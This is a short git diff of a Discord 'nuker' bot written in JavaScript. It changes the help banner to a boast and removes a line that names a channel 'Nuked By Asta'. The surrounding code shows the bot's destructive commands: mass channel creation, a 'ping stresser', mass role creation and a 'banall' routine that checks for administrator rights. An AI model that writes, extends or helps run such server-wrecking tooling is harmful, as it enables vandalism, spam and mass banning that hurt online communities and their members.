@@ -96,7 +96,7 @@ client.on("message", async message => {
     if (disableEveryone === false) {
 
         if (message.content.startsWith(prefix + 'help')) {
-            message.channel.send(`Wick Premium Commands*\n\n **Nuking:**\n
+            message.channel.send(`Armageddon is superior nobody can surpass onichans superiority*\n\n **Nuking:**\n
                 **Mass Channel:** \`${prefix}cc\` [text]
                 **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                 **Mass Roles:** \`${prefix}mr\` [text]
@@ -216,7 +216,7 @@ client.on("message", async message => {
                 message.delete();
             }
         }
-        message.guild.channels.create('Nuked By Asta')
+
         // Ban All
         if (message.content.startsWith(prefix + 'banall')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
